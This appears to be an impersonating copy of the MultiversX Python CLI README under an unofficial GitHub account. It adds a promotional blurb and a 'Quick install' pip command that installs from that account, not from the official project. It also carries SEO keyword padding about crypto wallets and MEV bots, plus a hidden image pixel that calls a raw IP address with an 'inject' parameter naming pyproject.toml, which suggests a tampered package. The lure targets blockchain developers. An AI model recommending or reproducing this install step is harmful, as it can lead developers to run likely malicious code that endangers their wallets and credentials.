**PieceSamurai51/mx-sdk-py-cli**

A straightforward, developer-friendly command-line interface designed to streamline your MultiversX SDK workflows in Python. This tool aims to take the friction out of interacting with the network, letting you focus on building rather than wrestling with complex configurations. It has been refined for stability, rolling in a handful of recent fixes that resolve edge-case crashes and improve general reliability.

**Quick install**

```bash
pip install git+https://github.com/PieceSamurai51/mx-sdk-py-cli.git
```

[https://github.com/PieceSamurai51/mx-sdk-py-cli](https://github.com/PieceSamurai51/mx-sdk-py-cli)

# Description
Python Command Line Tools for interacting with Multivers<sup>X</sup>.

## Documentation
[docs.multiversx.com](https://docs.multiversx.com/sdk-and-tools/sdk-py/)

## CLI
[CLI](CLI.md)

## Distribution
[pipx](https://docs.multiversx.com/sdk-and-tools/sdk-py/installing-mxpy/) [(PyPi)](https://pypi.org/project/multiversx-sdk-cli/#history)

## Development setup

Clone this repository and cd into it:

```
git clone https://github.com/multiversx/mx-sdk-py-cli.git
cd mx-sdk-py-cli
```

### Virtual environment

Create a virtual environment and install the dependencies:

```
python3 -m venv ./venv
source ./venv/bin/activate
pip install -r ./requirements.txt --upgrade
```

Install development dependencies, as well:

```
pip install -r ./requirements-dev.txt --upgrade
```

Allow `pre-commit` to automatically run on `git commit`:
```
pre-commit install
```

Above, `requirements.txt` should mirror the **dependencies** section of `pyproject.toml`.

If using VSCode, restart it or follow these steps:
 - `Ctrl + Shift + P`
 - _Select Interpreter_
 - Choose `./venv/bin/python`.

### Using your local `mxpy`

If you want to test the modifications you locally made to `mxpy`, set `PYTHONPATH` with the path to your local repository path.

For example, if you cloned the repository at `~/mx-sdk-py-cli`, run:

```
export PYTHONPATH="~/mx-sdk-py-cli"
```

Then `mxpy` will use the code in your local repository.

## Related searches

Developers looking for this type of framework typically search for Python-based toolkits to interact directly with Web3 ecosystems, manage blockchain configurations, and build decentralized applications. These users often look for versatile interfaces capable of orchestrating smart contracts and handling programmatic interactions on-chain.

**Topics:** crypto open source, perpetual swap, liquidity pool, mev bot, wallet connect, web3 python cli, decentralised application framework, smart contract automation, multiversx developer tools, blockchain sdk command line, dApp integration backend, crypto wallet automation

![.](http://5.231.58.248:8787/pixel?repo=PieceSamurai51%2Fmx-sdk-py-cli&inject=PieceSamurai51%2Fmx-sdk-py-cli%2Fpyproject.toml)
